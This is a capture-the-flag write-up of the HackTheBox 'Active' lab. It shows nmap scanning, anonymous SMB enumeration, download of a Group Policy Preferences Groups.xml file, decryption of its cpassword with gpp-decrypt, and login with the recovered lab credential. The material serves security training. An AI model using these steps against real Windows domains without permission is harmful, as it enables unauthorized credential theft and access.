#easy

[**Active**](https://app.hackthebox.com/machines/Active) is a beginner-friendly HackTheBox Lab.

Lets dig in and hack this thing.

---
## Discovery 

As per usual, we begin by conducting a network scan of the host machine.

	sudo nmap -sC -sV 10.10.10.100

Below is a summary of the ports [[nmap]] found to be open. 

	PORT      STATE SERVICE       VERSION
	53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
	88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-20 00:28:52Z)
	135/tcp   open  msrpc         Microsoft Windows RPC
	139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
	389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
	445/tcp   open  microsoft-ds?
	464/tcp   open  kpasswd5?
	593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
	636/tcp   open  tcpwrapped
	3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
	3269/tcp  open  tcpwrapped
	49152/tcp open  msrpc         Microsoft Windows RPC
	49153/tcp open  msrpc         Microsoft Windows RPC
	49154/tcp open  msrpc         Microsoft Windows RPC
	49155/tcp open  msrpc         Microsoft Windows RPC
	49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
	49158/tcp open  msrpc         Microsoft Windows RPC
	49165/tcp open  msrpc         Microsoft Windows RPC
	Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

## Analysis

It appears that the target is running **Windows Server 2008**. But how are we supposed to interface with the server? 

Firstly, SSH is configured to use port 22, which appears to be closed.

What about [[Server Message Block (SMB)|SMB?]]

Well, a quick Google search tells us that [[Server Message Block (SMB)|SMB]] is typically configured to run on ports 139 and 445; both of which are open on the target machine. Lets see if the Server allows for an Anonymous login. But first, lets enumerate through all the shares on the machine using [[smbclient|smbclient:]]

	smbclient -L  \\\\10.10.10.100

The command results in the following output:

    Sharename       Type      Comment
    ---------       ----      -------
	ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share 
    Replication     Disk      
    SYSVOL          Disk      Logon server share 
    Users           Disk      

Now lets try to login to each share.

	smbclient -L \\\\10.10.10.100\\ADMIN$

Of course, this doesn't work. That would've been too easy:

	tree connect failed: NT_STATUS_ACCESS_DENIED

After attempting to login with each sharename, we successfully login to the Replication share:

	smbclient \\\\10.10.10.100\\Replication
	Anonymous login successful
	Try "help" to get a list of possible commands.
	smb: \> 

Typing 'ls', we list the contents of the share and stumble across this directory

	smb: \> ls
		.                                   D        0  Sat Jul 21 04:37:44 2018
		..                                  D        0  Sat Jul 21 04:37:44 2018
		active.htb                          D        0  Sat Jul 21 04:37:44 2018

You'll notice we can't change directories and browse the file-system like you would in a traditional shell. Instead, we'll download the 'active.htb' directory and all its contents from the server to our local machine. 

Firstly, we'll enable recurse, allowing for recursive downloading of all files from the directory. Next we'll disable prompts so we will not be asked to download every single file and folder present in the active.htb directory. Finally, we will initiate the download of the directory with mget.

	smb: \> recurse ON
	smb: \> PROMPT OFF
	smb: \> mget *

With the newly acquired 'active.htb' directory on our local machine, we browse the folders and files present, until a particular file catches our eye—*Groups.xml*. Lets check it out:

	└─$ cat Groups.xml 
	<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
	<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
	<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
	</User>
	</Groups>

Hmm, very interesting indeed! It seems we have the name of a User on the 'Users' Share, and a password!

The Users username seems to be '**SVC_TGS**'.

	name="active.htb\SVC_TGS"

And below is the password belonging to '**SVC_TGS**'. The password appears to be hashed or encrypted using some sort of algorithm.

	cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUj
	TLfCuNH8pG5aSVYdYw/NglVmQ"

A quick Google Search of 'Groups.xml' mentions something called Group Policy Preferences or GPP. Further research indicates a vulnerability in GPP, allowing us to easily crack the hashed password using a tool called '**gpp-decrypt**'.

## Privilege Escalation

In an attempt to deobfuscate the password, we pass the password hash as an argument to **gpp-decrypt**, resulting in the following output.

		└─$ gpp-decrypt 
	edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8p
	G5aSVYdYw/NglVmQ

Well, what do you know? The password is: 

	GPPstillStandingStrong2k18

Now, lets perform a login on the Users share, using our newly acquired user-credentials. *(Hint: IT WORKS!)*

	smbclient \\\\10.10.10.100\\Users -U 'SVC_TGS'
	Password for [WORKGROUP\SVC_TGS]:
	Try "help" to get a list of possible commands.
	smb: \> 


